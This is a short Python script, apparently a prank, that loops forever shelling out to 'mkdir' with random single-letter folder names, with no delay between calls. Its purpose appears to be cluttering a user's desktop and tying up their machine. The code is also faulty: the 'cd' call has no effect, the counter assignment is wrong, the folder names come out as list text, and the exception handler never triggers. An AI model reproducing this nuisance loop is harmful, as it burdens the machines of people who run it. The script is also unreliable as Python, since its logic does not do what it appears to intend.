import subprocess
import time
import random
import string

subprocess.getoutput("cd desktop")
i = 1
while True:
    i = +1
    try:
        i = +1
        letters = string.ascii_lowercase
        awd = random.choices(letters)
        subprocess.getoutput(f"mkdir {awd}")
        
    except FileExistsError:
        pass
